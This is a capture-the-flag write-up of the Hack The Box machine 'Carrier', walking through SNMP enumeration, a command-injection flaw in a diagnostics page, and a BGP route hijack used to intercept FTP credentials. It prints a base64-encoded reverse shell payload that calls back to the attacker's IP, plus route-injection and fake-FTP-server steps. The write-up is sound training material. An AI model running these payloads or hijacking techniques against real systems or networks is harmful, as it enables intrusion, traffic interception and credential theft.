On average, Carrier is a medium-difficulty Linux box. With this being said, the `user.txt` flag is likley a "tricky-but-easy" diffciculty whereas the `root.txt` flag is something like moderately-difficult. Carrier provides challengers with an overall unique experience. As mentioned previously, the `user.txt` flag is relatively straight forward. Some lazy administration paired with some publicly-accessible information on the web server allows for an initial foothold. The lack of sanitization leads to `root` access to the first system. That's right, there are multiple players in this game. For the `root.txt` flag, a [BGP hijacking](https://en.wikipedia.org/wiki/BGP_hijacking) attack must be carried out. This tutorial aims to include the information in itself to explain the basics of the BGP routing protocol as well as to outline the (somehwat unique) path of attack to obtain the `root.txt` flag.

*Note: I completed this challenge on January 12th, 2019, however I'm just now writing it up in December 2019. As such, some of the details are sparse.*

## User
To begin the enumeration process, a port scan was run against the target using `masscan`. The purpose of "this initial scan is to quickly determine which ports are open so that a more focused `nmap` scan can be performed that will target only the open ports discovered by `masscan`.

```
root@kali:~/workspace/hackthebox/Carrier# masscan -e tun0 -p 1-65535 --rate 2000 10.10.10.105

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-12-24 15:19:16 GMT

...
```

From `masscan`, it was revealed that TCP ports 22(SSH) and 80(HTTP) were listening for connections. Using this information, a second scan was run using `nmap` to more thoroughly examine the services listening on the discovered ports.

```

As expected, the service listening on port 22 is SSH and the service listening on port 80 is HTTP. 

At this time, an additional `nmap` scan was run on 100 UDP ports.

This scan reveals the SNMP (Simple Network Management Protocol) on UDP port 161.

Starting with TCP port 80, browsing to `http://10.10.10.105` directs the user to a "Lyghtspeed" login portal. 

![lyghtspeed_login.png](/assets/images/htb/carrier/lyghtspeed_login.png)

Interestingly enough, the page loads with some errors (`Error 45007` and `Error 45009`). The errors are present before interacting with the website in any way. Simple username password combinations were entered into the login form in an attempt to authenticate to the web application, but to no avail.

Continuing on, a `gobuster` scan was initiated in hopes of enumerating directories present on the webserver.

```
root@kali:~/workspace/hackthebox/Carrier# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.105
```

A variety of directories were discovered by `gobuster` shortly after the scan was launched.

```
/img (Status: 301)
/tools (Status: 301)
/doc (Status: 301)
/css (Status: 301)
/js (Status: 301)
/fonts (Status: 301)
/debug (Status: 301)
/server-status (Status: 403)
```

Enumerating these directories further revealed some interesting information. The `/img` directory is where the "Lyghtspeed" logo is stored and the `/tools` directory contains a `remote.php` file which suggests that the web server runs PHP code. The most interesting directory is `/doc` which contains two files; `diagram_for_tac.png` and `error_codes.pdf`.

The `diagram_for_tac.png` is a diagram that represents three routers that appear to belong to three different companies (perhaps ISPs); `Lyghtspeed Networks`, `Zaza Telecom`, and `CastCom`. Additionally, the diagram includes autonomous system numbers, or AS numbers for each company. As part of the Border Gateway Protocol (BGP) routing protocol, ASNs are used to uniquely identify each network on the internet. 

<a id="isp_diagram"><a>
![isp_diagram.png](/assets/images/htb/carrier/isp_diagram.png)

The `error_codes.pdf` document contains a two column table that provides a description for a variety of error codes, including the error codes `45007` and `45009` that were found on the Lyghtspeed login page.

![error_codes.png](/assets/images/htb/carrier/error_codes.png)

From this table, `Error 45007` is due to an invalid or expired license while `Error 45009` reports that system credentials have not been set, and that the default `admin` user's password is that of the chassis serial number.

Next, the `snmp_login` Metasploit module was used to attempt to login to the SNMP service on UDP port 161.

![snmp_login.png](/assets/images/htb/carrier/snmp_login.png)

Running the module with `run` results in the following output:

```
msf5 auxiliary(scanner/snmp/snmp_login) > run

[!] No active DB -- Credential data will not be saved!
[+] 10.10.10.105:161 - Login Successful: public (Access level: read-write); Proof (sysDescr.0): 
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

This confirms that the SNMP service on UDP 161 is using the default `public` community, and that `read-write` permissions are set for the `public` community.

Further enumerating SNMP with the `snmpwalk` tool reveals the following information:

```
root@kali:~/workspace/hackthebox/Carrier# snmpwalk -v1 -c public 10.10.10.105
iso.3.6.1.2.1.47.1.1.1.1.11 = STRING: "SN#NET_45JDX23"
End of MIB
```

The `STRING: "SN#NET_45JDX23` output suggets a possible chassis serial number that could be the `admin` user's default password, as previously mentioned in the `error_codes.pdf` document.

Moving focus back to the Lyghtspeed login page, the web application can be successfully authenticated to using the username/password combination of `admin` / `NET_45JDX23`. Once logged in, access to the dashboard, Lyghtspeed ticketing system, and diagnostics panel is granted.

![authenticated.gif](/assets/images/htb/carrier/authenticated.gif)

There are a couple of interesting things to note here. 

First, taking a closer look at the notes accessible from the "Tickets" page reveals some potentially useful information. The content of the juciest note is shown below.
<a id="ticket_note"><a>
```
Rx / CastCom. IP Engineering team from one of our upstream ISP called to report a 
problem with some of their routes being leaked again due to a misconfiguration on our 
end. Update 2018/06/13: Pb solved: Junior Net Engineer Mike D. was terminated yesterday.
Updated: 2018/06/15: CastCom. still reporting issues with 3 networks: 10.120.15,
10.120.16,10.120.17/24's, one of their VIP is having issues connecting by FTP to an 
important server in the 10.120.15.0/24 network, investigating... Updated 2018/06/16: No 
prbl. found, suspect they had stuck routes after the leak and cleared them manually.
```

This content does not seem extremely relevant at the moment, but it could come in handly later. The note suggets that there are some potential network routing issues and that there is an important FTP server in the `10.120.15.0/24` network. The fact that an upstream ISP is reporting that their routes are being "leaked" suggests that the Lyghtspeed ISP may be advertising routes incorrectly through BGP. Recall the diagram mentioned previously that represents three ISPs and their respective ASNs.

Second, clicking the "Verify status" button on the "Diagnostics" page results in the return of some diagnostic information.

![diag_status.png](/assets/images/htb/carrier/diag_status.png)

The format of this output suggests that a command such as `ps waux` is being run on the system when the "Verify status" button is clicked. For comparison purposes, the `ps waux | grep tmux` command was run on the attacking system, which results in the following output. Note the similarities to the output in the screenshot above.

```
root       2371  0.0  0.0   7228  3908 ?        Ss   08:12   0:01 tmux new -s VPN
root       2591  0.0  0.0   6240  2832 pts/0    S+   08:19   0:00 tmux new -s HTB
root       4418  0.0  0.0   6140   900 pts/3    S+   11:15   0:00 grep tmux
```

Knowing this, the request that is made to the server upon clicking "Verify status" was examined using `burpsuite`. 

```
POST /diag.php HTTP/1.1
Host: 10.10.10.105
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0

check=cXVhZ2dh
```

From this, the `check` parameter can be modified to achieve different results. For example, removing the `cXVhZ2dh` string from the `check` parameter results in no information being returned from the status check. The characters within `cXVhZ2dh` are all valid base64-encoded characters. Placing the `cXVhZ2dh` value in a local `check.txt` file on the attacking machine and utilizing the `base64` tool to decode the content of the file revals the following:

```
root@kali:~/workspace/hackthebox/Carrier# base64 -d check.txt 
quagga
```

"Quagga" is a network routing software suite for Linux that facilitates the implementation and management of routing protocols such as BGP. It appears that the "Verify status" check is passing the value of the `check` parameter to a command similar to `ps waux | grep $check`, where `$check` is a base64 encoded string.

Burp Suite's "Repeater" functionality was used to test whether there is input sanitzation in place within the PHP code that runs the "Verify status" check. In a request to the webserver, the base64-encoded value `O2xzCg==` was passed as the `check` parameter. The base64-encoded value corresponds to the UTF-8 string `;ls`. This process and the result of the test is shown in the image below.

![sanitize_check.png](/assets/images/htb/carrier/sanitize_check.png)

This confirms that the "Verify status" check is not sanitizing input passed as the `check` parameter and that remote code execution is possible because of this flaw. To gain access to the system, the reverse shell command shown below can be used.

```
;sh -i >& /dev/tcp/10.10.14.17/4444 0>&1
```

The command above needs to be base64-encoded, which results in the following string:

```
O3NoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjE3LzQ0NDQgMD4mMQo=
```

After starting a listener on the attacking system with `nc -lp 4444` and passing the above value as the `check` parameter within a `POST` request to the server using `burpsuite`, a reverse shell connection from the target system is obtained.

![r1_owned.gif](/assets/images/htb/carrier/r1_owned.gif)

The `sh` shell can be upgraded using the Python shell upgrade technique as explained [here](https://mnorris.io/hackthebox/Curling/#shell_upgrade).

As the `root` user of the remote system, the `user.txt` flag can be read.

```
root@r1:~# cat user.txt
5649c41d<redacted>
```

## Root
Before moving on, it is important to note a few things.

* The hostname of the current system is `r1`.
```
root@r1:~# hostname
r1
```
* There is no `root.txt` file on this system.
```
root@r1:~# find / -name root.txt 2> /dev/null
root@r1:~# 
```
* The `authorized_keys` file in the `/root/.ssh` directory contains two public keys; one for `ppacket@carrier` and one for `root@web`.
* The machine has three network interfaces (excluding the loopback interface `lo`); `eth0: 10.99.64.2/24`, `eth1:  10.78.10.1/24`, and `eth2: 10.78.11.1/24`
* The `arp` table includes IP addresses from all of the networks listed above
```
root@r1:~# arp
Address                  HWtype  HWaddress           Flags Mask            Iface
10.78.10.2               ether   00:16:3e:5b:49:a9   C                     eth1
10.78.11.2               ether   00:16:3e:c4:fa:83   C                     eth2
10.99.64.1               ether   fe:61:89:cd:3b:4f   C                     eth0
10.99.64.251             ether   00:16:3e:f3:92:14   C                     eth0
```

Moving on, the attacking system's public SSH key can be copied to the `authorized_keys` file on the `r1` system. This allows for access over SSH in a more stable manner than the upgraded Python shell allows for. Remote port forwarding is required for this to work. The steps to access `r1` over SSH are shown below.

1. Copy the public SSH key `id_rsa.pub` from the attacking system to the `/root/.ssh/authorized_keys` file on `r1` (`10.10.10.105`).
2. If necessary,  start the SSH service on the attacking machine with `service ssh start`.
3. Issue `ssh -f -N -R 2222:localhost:22 root@10.10.14.17` on `r1`. This command opens up port `2222` on the attacking system and forwards the target system's port `22` to the attacking system's port `2222`. Note that `10.10.14.17` is the attacking system's IP in this example.
4. Issue `ssh root@locahost -p 2222` to connect to the SSH service on port 22 of `r1`
5. Enjoy the fully interactive terminal session

With a strong, established foothold on `r1`, enumeration eventually led to the discovery of the various `quagga` suite configuration files present within the `/etc/quagga` directory. 

```
root@r1:/etc/quagga# ls -lah
total 32K
drwxrwxr-x 1 quagga quaggavty  186 Jul  2  2018 .

-rw-r----- 1 quagga quagga     326 Jul  2  2018 zebra.conf.sav
```

Of particular interest is the `bgpd.conf` file.

Note that the `bgpd.conf` file and the `zebra.conf` file are where configuration changes made via the `vtysh` tool are saved. The `vtysh` tool performs similarly to many Cisco operating systems and can be accessed by issuing the `vtysh` command on `r1`. From here, the `?` symbol can be issued either alone or following a valid command for more information on available command options.

The `bgpd.conf` file contains the BGP configuration that's currently in use on `r1`.

```

 neighbor 10.78.11.2 route-map to-as300 out
!
line vty
!
```

The lines beginning with `route-map` can more-or-less be ignored in this case, as they are set to `permit` and are not accompanied by any `match` commands which would provide potential route advertisement filtering. The `router bgp 100` command creates the BGP process on the system where `100` is the ASN. Recall the ISP [diagram](#isp_diagram) discovered previously, where `Lyghtspeed Networks` is illustrated using AS100, `Zaza Telecom` using AS200, and `CastCom` using AS300.

Within the `router bgp 100` configuration, the `router-id` is set which isn't important in this context. The two `network` commands following configure the `router bgp 100` process to advertise routes for the networks `10.101.8.0/21` and `10.101.16.0/21` to any BGP neighbors. This is to say that `r1` will advertise to its two neighbors that traffic destined to the `10.101.8.0/21` subnet and the `10.101.16.0/21` should be forwarded to `r1` for further routing. In other words `r1` is advertising that it knows how to route traffic destined to the two subnets configured within the two `network` statements.

The `redistribute connected` command means that routes that are listed as connected in the route table of `r1` will be redistrubuted to (included in) the BGP process. This detail isn't very important in tihs case.

The first two `neighbor` commands define BGP peers for the `router bgp 100` process. The first `neighbor` command defines `10.78.10.2` as a BGP neighbor that is using AS200 (`Zaza Telecom`) and the second `neighbor` command defines `10.78.11.2` as a BGP neighbor that is using AS300 (`CastCom`). Reflecting back on the output of the `arp` command run on `r1` confirms that `Zaza Telecom` is out the `eth1` interface of `r1` and that `CastCom` is out the `eth2` interface of `r1`.

```
10.78.10.2               ether   00:16:3e:5b:49:a9   C                     eth1
10.78.11.2               ether   00:16:3e:c4:fa:83   C                     eth2
```

The next two `neighbor` commands are not important, as they're simply applying the route maps configured with the `route-map` commands that don't match any access lists.

To summarize the BGP configuration defined within the `bgpd.conf` file:

1. AS100 is in use by `r1`, as defined by the `router bgp 100` command
2. `r1` is peering with (i.e. sending routes to and receiving routes from) two BGP neighbors; `10.78.10.2` (AS200, `Zaza`) and `10.78.11.2` (AS300, `CastCom`)
3. `r1` is advertising that traffic destined for the `10.101.8.0/21` subnet, the `10.101.16.0/21` subnet, and its directly connected subnets should be sent to `r1`, as defined by the `network` commands and the `redistribute connected` command

Recall the [note](#ticket_note) found on the "Tickets" page of the web application that mentions the FTP server in the `10.120.15.0/24` network. Examining the route table on `r1` shows that the `10.120.15.0/24` network (where the FTP server is) is accessible via the `10.78.11.2` BGP neighbor (AS300, `CastCom`). This route is in the routing table of `r1` as a route learned through BGP. In other words, the `10.78.11.2` neighbor that uses AS300 is advertising to its BGP peers (`r1` being one of them) a route for the `10.120.15.0/24` network.

The output below (the result of running `show ip route bgp` after running the `vtysh` tool on `r1`) shows a portion of the routes learned through BGP on `r1`.

```
r1# show ip route bgp
Codes: K - kernel route, C - connected, S - static, R - RIP,
       O - OSPF, I - IS-IS, B - BGP, P - PIM, A - Babel,
       > - selected route, * - FIB route

B>* 10.100.10.0/24 [20/0] via 10.78.10.2, eth1, 00:09:28
...
B>* 10.100.20.0/24 [20/0] via 10.78.10.2, eth1, 00:09:28

...
B>* 10.120.15.0/24 [20/0] via 10.78.11.2, eth2, 00:09:26
...
B>* 10.120.20.0/24 [20/0] via 10.78.11.2, eth2, 00:09:26
```

From the perspective of `r1`, the line `B>* 10.120.15.0/24 [20/0] via 10.78.11.2, eth2, 00:09:26` from the route table above can be read as: "Traffic with a destination IP address of `10.120.15.1` - `10.120.15.254` should be sent to `10.78.11.2` which is connected to the `eth2` interface."

The route table for the `Zaza Telecom` router would have a similar entry that would route traffic destined for `10.120.15.0/24` through the `CastCom` router, as the `CastCom` BGP neighbor is advertising to its neighbors (`Lyghtspeed Networks` and `Zaza Telecom`) that all traffic destined to the 254 usable IP addresses in the FTP server's `10.120.15.0/24` network should be routed through it. 

A [BGP hijacking](https://en.wikipedia.org/wiki/BGP_hijacking) attack can be unfurled so that all traffic destined for the `10.120.15.0/24` network is instead routed to `r1` of `Lyghtspeed Networks`. As part of the BGP protocol, if two overlapping routes are advertised by two different AS numbers (i.e. BGP neighbors) and no AS path prepending is in place, then the more specific route will be accepted into the receiver's route table.

For example, imagine the FTP server has an IP address of `10.120.15.1`. The `10.120.15.0/24` network includes IP addresses in the range `10.120.15.1` - `10.120.15.254`, therefore the `10.120.15.0/24` subnet includes the FTP server. Continuing with the example, the `10.120.15.0/25` network includes IP addresses in the range `10.120.15.1` - `10.120.15.127`. This means that the `10.120.15.0/25` subnet *also* includes the FTP server, but more specifically than the `10.120.15.0/24` network.

By reconfiguring the `router bgp 100` process on `r1` to advertise a more specific route to its BGP neighbors (particularly to the `Zaza Telecom` neighbor), the "VIP" traffic destined for the FTP server in the `10.120.15.0/24` network will be routed to `r1` instead of to the `CastCom` router. The following `network` command was added to the `router bgp 100` process on `r1` to achieve this goal.

```
network 10.120.15.0/25
```

Running the commands shown below result in BGP hijacking.

```
root@r1:~# vtysh

From this position, the `tcpdump` tool can be used on `r1` to capture FTP traffic on port 21. The command will write received traffic to the file called `ftp.dump`.

`root@r1:~# tcpdump -A -i any port 21 -vv -w ftp.dump`

Once FTP traffic was written to the `ftp.dump` file, the file was transferred to the attacking system to be examined with `wireshark`.

Issuing the `wireshark ftp.dump` command shows that the IP address of the FTP server is `10.120.15.10`.

![ftp_dest.png](/assets/images/htb/carrier/ftp_dest.png)

Next, a new loopback interface, `lo:1`, was configured on `r1` using the IP address of the FTP server. This interface will be used as a dummy FTP server for the FTP client.

```
root@r1:~# ifconfig lo:1 10.120.15.10/25
```

Additionally, a static route was added that would route traffic destined for `10.120.15.10` to the `lo:1` interface.

```
root@r1:~# ip route add 10.120.15.10/32 via 0.0.0.0 dev lo:1
```

Now, a `nc` listener was set up that will listen for incoming connections on TCP port 21.

```
root@r1:~# nc -l 10.120.15.10 21
```

Eventually, a connection is received. By mimicking the return codes of an FTP server, the following exchange was made with the FTP client. The lines ending with the `*` characters mark the mimicked FTP server codes that were manually sent in response to the client's requests.

```
USER root
331 User name okay, need password.*
PASS BGPtelc0rout1ng
227 Entering Passive Mode. (10,120,15,10,8,75).* 
STOR secretdata.txt
150 File status okay; about to open data connection.*
226 Closing data connection. Requested file action successful (for example, file transfer or file abort).*
QUIT
```

Only the return code numbers need to be sent for the interaction to take place, but the text offers an explanation for the return code. Note that the `227 Entering Passive Mode` return code specifies an IP address and port for data transfer in the form of (h1,h2,h3,h4,p1,p2). The value in the code above correlates to `10.120.15.10:2123`. In order for the data transfer to successed, an additional `nc` listener needs to be set up on port 2123 before the `227` code sent to the client. This process is shown below.

```
root@r1:~# nc -lvp 2123
nc -lvp 2123
Listening on [0.0.0.0] (family 0, port 2123)
Connection from [10.78.10.2] port 2123 [tcp/*] accepted (family 2, sport 52968)
56484a766247786c5a43456849513d3d
```

The transferred `secretdata.txt` file contains the value shown below, and seems irrelevant.

```
56484a766247786c5a43456849513d3d
```

Using the username `root` and the password `BGPtelc0rout1ng` as received from the FTP server/client exchange allows for SSH access to the `10.120.15.10` server once the original routing for the `10.120.15.0/24` network is restored.

To restore the original routing, issue the commands below on `r1`:

1. `ifconfig lo:1 127.0.0.2`
2. `ip route del 10.120.15.10 dev lo`
3. `ip route add 10.120.15.0/24 via 10.78.11.2 dev eth2`

After the SSH connection to `10.120.15.10` (hostname, `carrier`) is made, the `root.txt` flag can be read.

```
root@carrier:~# cat root.txt
